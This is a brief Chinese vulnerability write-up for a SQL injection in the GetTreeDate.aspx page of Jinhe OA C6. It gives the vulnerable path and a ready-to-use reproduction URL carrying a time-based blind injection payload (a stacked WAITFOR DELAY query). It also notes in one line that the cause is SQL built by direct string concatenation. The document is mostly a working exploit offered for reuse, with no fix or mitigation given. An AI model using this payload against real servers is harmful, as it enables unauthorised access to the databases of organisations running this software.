# 金和OA C6-GetTreeDate.aspx sql注入漏洞

     

### 1. 漏洞链接

http://xx.xx.xx.xx/C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1

### 2. 复现步骤

http://xx.xx.xx.xx/C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1%3bWAITFOR+DELAY+'0%3a0%3a5'+--%20and%201=1

### 3. 代码审计

直接拼接sql语句导致注入产生
